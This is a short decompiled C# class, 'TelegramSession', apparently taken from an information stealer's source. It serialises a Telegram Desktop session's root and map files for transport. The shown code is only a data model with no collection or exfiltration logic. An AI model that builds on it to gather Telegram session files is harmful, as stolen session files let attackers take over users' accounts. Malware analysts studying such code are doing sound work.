using System;
using System.ComponentModel;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x0200016E RID: 366
	[ProtoContract(Name = "TelegramSession")]
	public class TelegramSession : INotifyPropertyChanged
	{
		// Token: 0x170002F8 RID: 760
		// (get) Token: 0x06000BD4 RID: 3028 RVA: 0x000092B6 File Offset: 0x000074B6
		// (set) Token: 0x06000BD5 RID: 3029 RVA: 0x000092BE File Offset: 0x000074BE
		[ProtoMember(1, Name = "RootFile")]
		public DesktopFile RootFile
		{
			get
			{
				return this._rootFile;
			}
			set
			{
				this._rootFile = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("RootFile"));
			}
		}

		// Token: 0x170002F9 RID: 761
		// (get) Token: 0x06000BD6 RID: 3030 RVA: 0x000092E2 File Offset: 0x000074E2
		// (set) Token: 0x06000BD7 RID: 3031 RVA: 0x000092EA File Offset: 0x000074EA
		[ProtoMember(2, Name = "MapFile")]
		public DesktopFile MapFile
		{
			get
			{
				return this._mapFile;
			}
			set
			{
				this._mapFile = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("MapFile"));
			}
		}

		// Token: 0x14000025 RID: 37
		// (add) Token: 0x06000BD8 RID: 3032 RVA: 0x0002352C File Offset: 0x0002172C
		// (remove) Token: 0x06000BD9 RID: 3033 RVA: 0x00023564 File Offset: 0x00021764
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x04000494 RID: 1172
		private DesktopFile _rootFile;

		// Token: 0x04000495 RID: 1173
		private DesktopFile _mapFile;
	}
}
